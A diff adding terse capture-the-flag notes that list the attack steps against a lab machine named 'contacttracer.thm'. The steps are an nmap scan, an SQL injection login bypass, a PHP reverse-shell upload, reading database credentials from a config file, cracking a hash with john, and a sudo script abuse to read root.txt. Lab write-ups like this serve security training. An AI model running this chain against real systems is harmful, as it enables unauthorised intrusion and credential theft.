@@ -1,0 +1,10 @@
+1 - nmap -A 10.10.55.97
+2 - echo "10.10.55.97 contacttracer.thm" | tee -a /etc/hosts
+3 - http://contacttracer.thm -> 'or 1=1-- -
+4 - cp /usr/share/webshells/php/php-reverse-shell.php .
+5 - cat /var/www/html/classes/DBConnection.php
+6 - john hash -w=/usr/share/wordlists/rockyou.txt
+7 - su cyrus
+8 - sudo -l 
+9 - sudo /opt/scan/scan.sh -> /root/root.txt
+10 - cat root.txt
